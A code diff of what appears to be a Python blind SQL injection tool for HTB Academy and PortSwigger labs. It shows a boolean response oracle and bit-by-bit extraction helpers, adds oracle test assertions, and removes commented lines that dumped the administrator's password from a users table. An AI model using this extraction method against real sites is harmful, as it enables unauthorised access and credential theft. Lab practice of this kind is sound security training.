@@ -17,6 +17,12 @@ def oracle(q):
     response = requests.get(url(),cookies=cookies)
     return "Welcome back!" in response.text  # Observe the response, and modify it
 
+# confirm oracle can run
+"""
+assert oracle("1=1")
+assert oracle("1=0")
+"""
+
 # Calculate the Length
 def dumpNumber(q):
     low = 0
@@ -39,11 +45,6 @@ def dumpString(q, length):
                 c |= 2**p
         val += chr(c)
     return val
-
-#for portswigger lab
-#length=dump_length("password")
-#print(length)
-#print(dump_string("SELECT password FROM users WHERE username = 'administrator'", length))
 
 func = int(input("""HTB_ACADEMY_ORACLE
 (1) Get Length
